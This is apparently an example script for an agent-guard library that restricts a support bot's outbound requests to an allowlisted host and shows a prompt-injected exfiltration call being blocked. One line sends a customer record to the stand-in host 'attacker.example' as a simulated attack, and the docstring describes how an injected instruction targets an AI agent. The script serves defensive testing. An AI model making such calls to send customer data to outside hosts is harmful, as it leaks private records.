"""Guard a network-egress tool: an exfiltration to an off-allowlist host is BLOCKED.

The egress rail is effect-performing — the proxy connects or refuses; the agent holds NOTHING
(no token is minted). The block is REAL but **advisory** on this build (a direct connection can
bypass the inline proxy until a netns forces it as the sole route — out of scope).

    python3 -m examples.guard_egress
"""
from signet import guard, Mandate
from examples.onramp import guarded_door     # to stop the proxy thread at the end (optional: it's a daemon)


def main() -> int:
    # Allow CONNECT only to payments.internal; everything else is off-mandate.
    mandate = (Mandate("support-bot", task_id="refund-001")
               .allow_db("public.credits", ops=("select", "insert"))
               .allow_egress("payments.internal")
               .build())

    def fetch_url(**args):
        ...  # your real outbound request

    safe_fetch = guard(fetch_url, mandate, rail="egress")

    # An injected instruction tries to exfiltrate a customer record to an external host.
    r = safe_fetch(host="attacker.example", port=443, url="https://attacker.example/leak?data=record")
    print(f"verdict: {r.outcome.upper()}   ({r.cause})")
    print(f"token minted for the agent: {bool(r.check_ref)}   (egress holds nothing — effect-performing)")
    assert r.outcome == "block" and r.check_ref is None

    guarded_door(mandate).stop()     # tear down the offline proxy
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
